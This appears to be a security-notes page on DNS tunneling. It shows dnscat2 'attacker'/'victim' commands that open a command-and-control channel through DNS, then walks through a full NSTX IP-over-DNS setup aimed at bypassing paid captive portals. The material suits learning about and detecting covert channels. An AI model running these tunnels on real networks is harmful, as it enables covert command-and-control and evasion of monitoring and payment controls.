# ⭕ DNS Tunneling

## <mark style="color:red;">DNSCat2</mark>

{% embed url="https://github.com/iagox86/dnscat2" %}

Establishes a C\&C channel through DNS. It doesn't need root privileges.

```
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com
```

## <mark style="color:red;">NSTX</mark>

is a hack to tunnel IP traffic over DNS.If DNS traffic does not work, but ICMP traffic (i.e., ping) works, try ICMPTX: IP-over-ICMP. Note that these instructions play nicely with ICMPTX. You can run both on one proxy.

You need several things to get going:

a DNS server that you can configure, (we'll call this ns.example.com) another server, one not running DNS. We're going to assume the IP address of this machine is 1.2.3.4. The reason you cannot run DNS on the same machine, is that you're going to run nstx on this machine. Nstx must run on port 53, like DNS. a crippled Internet connection, i.e., one that only allows you to issue DNS queries.

### <mark style="color:orange;">Configure a new DNS subdomain</mark>

Let's assume you're running the domain "example.com". The nameserver for this domain is, as mentioned before, "ns.example.com". Configure "ns.example.com" by adding a subdomain, "tunnel.example.com". You do this by appending the following DNS records at the end of the zone file for "example.com":

```
;
; subdomain for IP-over-DNS tunnelling
;
$ORIGIN tunnel.example.com.
@               IN      NS      ns.tunnel.example.com.
ns              IN      A       1.2.3.4
```

In other words. We configured 1.2.3.4 to be the name server for a new subdomain "tunnel.example.com".

### <mark style="color:orange;">Install and configure the bogus DNS server</mark>

On the machine 1.2.3.4, make sure your kernel supports the TUN/TAP network device. If you installed a standard 2.6 kernel image, it does. You may have to manually /sbin/modprobe tun. Install the nstx Debian package:

```
apt-get install nstx
```

Edit /etc/default/nstx and set NSTX\_DOMAIN to "tunnel.example.com" and set start\_nstxd to "yes". Finally, set ifup\_tun0 to "yes". In /etc/network/interfaces, define a new interface tun0, as follows:

```
iface tun0 inet static
  address 10.0.0.1
  netmask 255.0.0.0
```

Now start the server by running:

```
/etc/init.d/nstxd restart
```

If you're not running Debian, you can skip all that and just download the code, compile it manually, and start the server by hand and then configure the tun0 network device:

```
# nstxd tunnel.example.com
# /sbin/modprobe tun
# /sbin/ifconfig tun0 up 10.0.0.1 netmask 255.255.255.0
```

Whether you're running Debian or not, after running the nstx server, make sure you now have a tun0 device:

```
# /sbin/ifconfig tun0
tun0      Link encap:UNSPEC  HWaddr XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX
          inet addr:10.0.0.1  P-t-P:10.0.0.1  Mask:255.0.0.0
          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1500  Metric:1
          RX packets:50 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:10
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
```

Now you need to enable forwarding on this server. I use iptables to implement masquerading. There are many HOWTOs about this (a simple one, for example). On Debian, the configuration file for iptables is in /var/lib/iptables/active. The relevant bit is:

```
*nat
:PREROUTING ACCEPT [6:1596]
:POSTROUTING ACCEPT [1:76]
:OUTPUT ACCEPT [1:76]

-A POSTROUTING -s 10.0.0.0/8 -j MASQUERADE
COMMIT
```

Restart iptables:

```
/etc/init.d/iptables restart
```

and enable forwarding:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

You can make sure this is permanent by editing /etc/sysctl.conf:

```
net/ipv4/ip_forward=1
```

### <mark style="color:orange;">Configure the client</mark>

Make sure the kernel on the client machine also supports the TUN/TAP network device. If you installed a standard 2.6 kernel image, it does. You may have to manually /sbin/modprobe tun. Install the nstx Debian package:

```
apt-get install nstx
```

Edit /etc/default/nstx and set NSTX\_DOMAIN to "tunnel.example.com" and set start\_nstxcd to "yes". Finally, set ifup\_tun0 to "yes". In /etc/network/interfaces, define a new interface tun0, as follows:

```
iface tun0 inet static
  address 10.0.0.2
  netmask 255.0.0.0
  mtu 500 # optional, may solve ssh problems
```

Marc Merlin points out that you may you want to add something like (below the mtu line)

```
post-up route del default; route add -net default gw 10.0.0.1
```

now you're sitting at an airport or in a cafe, and you have internet access and they want your money before allowing you on the Internet. However, you noticed that you can issue DNS queries.

Assuming you got an IP address through DHCP, you should now know the IP address of the DNS server they want you to use. Your /etc/resolv.conf will contain at least one "nameserver" entry. Make sure you use the first nameserver entry in /etc/resolv.conf and remove the others. For the sake of this example, let's call the first and remaining nameserver 66.77.88.99. Edit /etc/default/nstx and change set NSTX\_DNS\_SERVER to "66.77.88.99". The latest nstx Debian package obviates this manual step as follows:

```
NSTX_DNS_SERVER=`grep nameserver /etc/resolv.conf |head -1|awk '{print $2}'`
```

That is, it simply sets NSTX\_DNS\_SERVER to the IP address of the first nameserver entry in /etc/resolv.conf.

Now, (re)start the nstx client:

```
 /etc/init.d/nstxcd restart
```

If you don't have Debian, start the client manually:

```
# nstxcd tunnel.example.com 66.77.88.99
# /sbin/modprobe tun
# /sbin/ifconfig tun0 up 10.0.0.2 netmask 255.255.255.0
```

Make sure you now have a tun0 device:

```
# /sbin/ifconfig tun0
tun0      Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00
          inet addr:10.0.0.2  P-t-P:10.0.0.2  Mask:255.0.0.0
          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:500
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
```

By running /sbin/route -n, figure out what your gateway is. It's the record with the "UG" Flags field. For example:

```
# /sbin/route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
192.168.1.0     0.0.0.0         255.255.255.0   U     0      0        0 wlan0
0.0.0.0         192.168.1.1     0.0.0.0         UG    0      0        0 wlan0
```

OK. So "192.168.1.1" is our gateway. Assuming your wireless network device is called "wlan0" (but it might well be "eth1", or whatever), run:

```
# /sbin/route del default
# /sbin/route add -host 66.77.88.99 gw 192.168.1.1 dev wlan0
# /sbin/route add default gw 10.0.0.1 tun0
```

Notice that "192.168.1.1" is the IP address of the gateway we learned by running "/sbin/route -n". Similarly, "66.77.88.99" is the nameserver from /etc/resolv.conf. Make sure you plug in the correct IP address in both cases.

You should now be all set. All DNS traffic is going straight to 66.77.88.99. All other traffic will be tunnelled through 1.2.3.4, via DNS.
